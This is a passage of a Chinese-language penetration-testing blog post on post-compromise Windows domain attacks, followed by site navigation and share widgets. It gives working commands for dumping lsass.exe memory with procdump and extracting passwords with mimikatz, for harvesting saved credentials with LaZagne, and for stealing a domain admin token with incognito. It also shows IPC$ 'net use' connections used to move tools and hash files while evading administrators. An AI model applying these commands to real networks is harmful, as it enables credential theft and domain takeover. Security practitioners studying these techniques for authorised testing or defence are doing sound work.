+<h3 id="lsass读取内存hash"><a href="#lsass读取内存hash" class="headerlink" title="lsass读取内存hash"></a><code>lsass</code>读取内存<code>hash</code></h3><p>比如在内网中，有一个域用户和域管登陆了你拿下的<code>shell</code>的机器，那么在本机中会将他们的账号和密码保存到<code>lsass.exe</code>进程里面，那么我们只要把<code>lsass.exe</code>进程抓取出来然后跑<code>hash</code>就可以了</p>
+<blockquote>
+<p><code>2008</code>前，他都是明文存储的</p>
+</blockquote>
+<p>抓取<code>lsass.exe</code>进程为<code>lsass.dmp</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">procdump.exe -accepteula -ma lsass.exe lsass.dmp</span></pre></td></tr></table></figure>
+
+<p><img src="http://static.zybuluo.com/1kbfree/uf2ev4graycnevmlwzf8w29f/image_1dsodrk67181t1si02g3ofg1dv19.png" alt="image_1dsodrk67181t1si02g3ofg1dv19.png-66.2kB"></p>
+<p>然后使用<code>mimikatz.exe</code>将起读取</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;sekurlsa::minidump lsass.dmo&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot;</span></pre></td></tr></table></figure>
+
+<p><img src="http://static.zybuluo.com/1kbfree/6k6cs2mlawtcfeekrranj3h5/image_1dsoe4llnnbsik31s011gaqe91m.png" alt="image_1dsoe4llnnbsik31s011gaqe91m.png-158kB"></p>
+<blockquote>
+<p>在目标<code>shell</code>中获取信息，然后放到本地用工具跑出这些数据，可以防止被拦截。</p>
+</blockquote>
+<p><img src="http://static.zybuluo.com/1kbfree/w0vcl8qirev4f2fy3vhfx8m7/image_1dsoecn2dsc316n1u2mosfi7r13.png" alt="image_1dsoecn2dsc316n1u2mosfi7r13.png-548.7kB"></p>
+<h3 id="读取当前机器各种连接工具密码、浏览器保存的密码等"><a href="#读取当前机器各种连接工具密码、浏览器保存的密码等" class="headerlink" title="读取当前机器各种连接工具密码、浏览器保存的密码等"></a>读取当前机器各种连接工具密码、浏览器保存的密码等</h3><blockquote>
+<p>下载地址：<br><a href="https://github.com/AlessandroZ/LaZagne/releases/" target="_blank" rel="noopener">https://github.com/AlessandroZ/LaZagne/releases/</a></p>
+</blockquote>
+<p><img src="http://static.zybuluo.com/1kbfree/6ezmkh24qn3ny9s6dm5b5fo9/image_1dsog5sm11go8ndcvcgrd5nbg20.png" alt="image_1dsog5sm11go8ndcvcgrd5nbg20.png-18.7kB"></p>
+<h3 id="凭证窃取"><a href="#凭证窃取" class="headerlink" title="凭证窃取"></a>凭证窃取</h3><blockquote>
+<p>下载地址：</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">incognito.exe list_tokens -u</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">incognito.exe execute -c &quot;HACK&#x2F;Administrator&quot; cmd.exe</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">窃取HACK&#x2F;Administrator这个域管的凭证，放到cmd.exe进程，这样子我们的cmd就是域管的权限了</span></pre></td></tr></table></figure>
+
+<p><img src="http://static.zybuluo.com/1kbfree/iuq1k28ksjnatvi3kavwsung/222.png" alt="222.png-363.2kB"></p>
+<h3 id="命令行渗透"><a href="#命令行渗透" class="headerlink" title="命令行渗透"></a>命令行渗透</h3><h4 id="为什么涉及命令行渗透？"><a href="#为什么涉及命令行渗透？" class="headerlink" title="为什么涉及命令行渗透？"></a>为什么涉及命令行渗透？</h4><p>1、因为远程登录目标桌面容易被管理员发现，如你将他挤下或者管理员突然间登录进来<br>2、目标管理员可能对服务器禁用远程登录</p>
+<p>那么我们可以建立<code>ipc</code>连接，建立了<code>ipc</code>连接的话我们可以对目标进行文件的下载和上传，以及执行命令</p>
+<h4 id="建立ipc连接"><a href="#建立ipc连接" class="headerlink" title="建立ipc连接"></a>建立<code>ipc</code>连接</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">net use \\你拿下的服务器ip &#x2F;u:用户名 密码</span></pre></td></tr></table></figure>
+
+<p><img src="http://static.zybuluo.com/1kbfree/nqedhvpnf66d3u64ntww6c9j/image_1dsqrqqqt11u91j7f1l3q9prdue4i.png" alt="image_1dsqrqqqt11u91j7f1l3q9prdue4i.png-45.6kB"></p>
+<p>在<code>ipc</code>连接下看目录是这样的</p>
+<p><img src="http://static.zybuluo.com/1kbfree/9m5jgrvud0xgzc0nk6jnarl0/9.png" alt="9.png-127.9kB"></p>
+<p>将<code>nbrscan.exe</code>放到<code>windows\temp</code>目录下</p>
+<p><img src="http://static.zybuluo.com/1kbfree/4jtv3ogmn3pek6m1lw7tpodm/image_1dsqtn8bu390qts1v6hauv6b05k.png" alt="image_1dsqtn8bu390qts1v6hauv6b05k.png-64.7kB"></p>
+<p>将<code>hash.txt</code>下载下来</p>
+<p><img src="http://static.zybuluo.com/1kbfree/vof0v5epueofvddg2vx90v4e/image_1dsqtqaj61o9h1c5fp61rnfivt61.png" alt="image_1dsqtqaj61o9h1c5fp61rnfivt61.png-126.2kB"></p>
+<p>这里直接粘贴了=v=</p>
+<p><img src="http://static.zybuluo.com/1kbfree/ewh1m28mv3pcgwsrcvkuregu/image_1dsqv7rgcfn9t1fhp1cki1mog6e.png" alt="image_1dsqv7rgcfn9t1fhp1cki1mog6e.png-333.3kB"></p>
+<p><img src="http://static.zybuluo.com/1kbfree/ikx81g2yu5o6m7rk1jhbytmu/3333.png" alt="3333.png-260.5kB"></p>
+<p>比如你上传的东西很大，那么我们可以使用这种办法</p>
+<p><img src="http://static.zybuluo.com/1kbfree/83m594kmea3w5dhqhxz1oizs/image_1dsr14pjr1lovqrh14ha1bg8pgk8n.png" alt="image_1dsr14pjr1lovqrh14ha1bg8pgk8n.png-336.7kB"></p>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <div class="content">
+        
+<span class="post-time">
+    Last updated: <time datetime="2019-12-24T04:38:15.327Z" itemprop="dateUpdated">2019-12-24 12:38:15</time>
+</span><br>
+
+
+        
+        未经允许，禁止转载：<a href="/2019/12/24/%E5%88%9D%E5%A7%8B%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AE%80%E7%95%A5%E7%AC%94%E8%AE%B0/" target="_blank" rel="external">http://yoursite.com/2019/12/24/%E5%88%9D%E5%A7%8B%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AE%80%E7%95%A5%E7%AC%94%E8%AE%B0/</a>
+        
+    </div>
+    
+    <footer>
+        <a href="http://yoursite.com">
+            <img src="/img/blog.jpg" alt="$_Fuck">
+            $_Fuck
+        </a>
+    </footer>
+</blockquote>
+
+        
+<div class="page-reward">
+    <a id="rewardBtn" href="javascript:;" target="_blank" rel="noopener" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
+</div>
+
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag">内网渗透</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://yoursite.com/2019/12/24/%E5%88%9D%E5%A7%8B%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AE%80%E7%95%A5%E7%AC%94%E8%AE%B0/&title=《初始域渗透简略笔记》 — $_Fuck&pic=http://yoursite.com/img/blog.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" target="_blank" rel="noopener" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://yoursite.com/2019/12/24/%E5%88%9D%E5%A7%8B%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AE%80%E7%95%A5%E7%AC%94%E8%AE%B0/&title=《初始域渗透简略笔记》 — $_Fuck&source=无助就算了，还要假装坚强。" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2019/12/24/%E5%88%9D%E5%A7%8B%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AE%80%E7%95%A5%E7%AC%94%E8%AE%B0/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《初始域渗透简略笔记》 — $_Fuck&url=http://yoursite.com/2019/12/24/%E5%88%9D%E5%A7%8B%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AE%80%E7%95%A5%E7%AC%94%E8%AE%B0/&via=http://yoursite.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://yoursite.com/2019/12/24/%E5%88%9D%E5%A7%8B%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AE%80%E7%95%A5%E7%AC%94%E8%AE%B0/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" target="_blank" rel="noopener" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2019/12/24/CVE-2018-9206%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%8E%9F%E7%90%86/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">CVE-2018-9206漏洞复现及原理</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2019/12/23/%E6%9C%89%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BF%AE%E6%94%B9%E6%9D%83%E9%99%90%E5%B9%B6%E4%B8%94%E6%83%B3%E7%99%BB%E9%99%86%E5%90%8E%E5%8F%B0%E4%BD%86%E5%AF%86%E7%A0%81%E4%B8%8D%E5%8F%AF%E9%80%86%E7%9A%84%E5%B0%8F%E6%80%9D%E8%B7%AF%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">有数据库修改权限并且想登陆后台但密码不可逆的小思路解决办法</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</article>
+
+<div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;" target="_blank" rel="noopener"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        禁止打赏~
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" src="/img/" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/" data-alipay="/img/">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechat">微信</span>
+                <span class="reward-toggle-label"></span>
+                <span class="reward-toggle-item alipay">支付宝</span>
+            </div>
+        </label>
+        
+    </div>
+</div>
+
+
+
+</div>
+
+        
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" target="_blank" rel="noopener" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://yoursite.com/2019/12/24/%E5%88%9D%E5%A7%8B%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AE%80%E7%95%A5%E7%AC%94%E8%AE%B0/&title=《初始域渗透简略笔记》 — $_Fuck&pic=http://yoursite.com/img/blog.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" target="_blank" rel="noopener" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://yoursite.com/2019/12/24/%E5%88%9D%E5%A7%8B%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AE%80%E7%95%A5%E7%AC%94%E8%AE%B0/&title=《初始域渗透简略笔记》 — $_Fuck&source=无助就算了，还要假装坚强。" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2019/12/24/%E5%88%9D%E5%A7%8B%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AE%80%E7%95%A5%E7%AC%94%E8%AE%B0/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《初始域渗透简略笔记》 — $_Fuck&url=http://yoursite.com/2019/12/24/%E5%88%9D%E5%A7%8B%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AE%80%E7%95%A5%E7%AC%94%E8%AE%B0/&via=http://yoursite.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://yoursite.com/2019/12/24/%E5%88%9D%E5%A7%8B%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AE%80%E7%95%A5%E7%AC%94%E8%AE%B0/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;" target="_blank" rel="noopener"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="//api.qrserver.com/v1/create-qr-code/?data=http://yoursite.com/2019/12/24/%E5%88%9D%E5%A7%8B%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AE%80%E7%95%A5%E7%AC%94%E8%AE%B0/" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: true };
+
+
+</script>
+
+<script src="/js/main.min.js?v=1.7.2"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="/js/search.min.js?v=1.7.2" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+<script>
+(function() {
+    var OriginTitile = document.title, titleTime;
+    document.addEventListener('visibilitychange', function() {
+        if (document.hidden) {
+            document.title = 'Bay！';
+            clearTimeout(titleTime);
+        } else {
+            document.title = 'Fuck的博客~';
+            titleTime = setTimeout(function() {
+                document.title = OriginTitile;
+            },2000);
+        }
+    });
+})();
+</script>
+
+
+
+</body>
+</html>
